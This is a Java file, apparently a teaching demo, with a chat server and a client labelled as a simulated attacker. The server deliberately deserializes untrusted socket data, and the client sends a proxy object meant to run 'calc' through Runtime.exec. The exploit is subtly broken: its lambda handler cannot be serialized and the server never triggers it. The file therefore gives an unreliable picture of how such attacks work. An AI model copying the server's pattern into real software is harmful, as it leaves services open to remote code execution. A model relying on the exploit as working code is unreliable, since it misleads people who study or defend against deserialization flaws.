import java.io.*;
import java.net.*;
import java.util.*;

class ChatServer {
    static class Message implements Serializable {
        String username;
        String content;
        
        Message(String user, String msg) {
            this.username = user;
            this.content = msg;
        }
        
        @Override
        public String toString() {
            return "[" + username + "]: " + content;
        }
    }

    public static void main(String[] args) throws Exception {
        ServerSocket ss = new ServerSocket(8080);
        System.out.println("Server started...");
        
        while (true) {
            Socket socket = ss.accept();
            new Thread(() -> {
                try (ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {
                    // 漏洞点：直接反序列化不可信数据
                    Object obj = ois.readObject();
                    
                    if (obj instanceof Message) {
                        System.out.println("Received: " + obj.toString());
                    } else {
                        System.out.println("Unknown object type: " + obj.getClass());
                    }
                } catch (Exception e) {
                    System.err.println("Error processing message: " + e.getMessage());
                }
            }).start();
        }
    }
}

// 模拟攻击者客户端
class EvilClient {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("127.0.0.1", 8080);
        try (ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {
            // 构造恶意序列化对象
            Object evilObject = java.lang.reflect.Proxy.newProxyInstance(
                EvilClient.class.getClassLoader(),
                new Class<?>[]{Class.forName("java.lang.Comparable")},
                (proxy, method, methodArgs) -> {
                    if (method.getName().equals("compareTo")) {
                        Runtime.getRuntime().exec("calc"); // 模拟命令执行
                    }
                    return null;
                }
            );
            oos.writeObject(evilObject);
        }
    }
}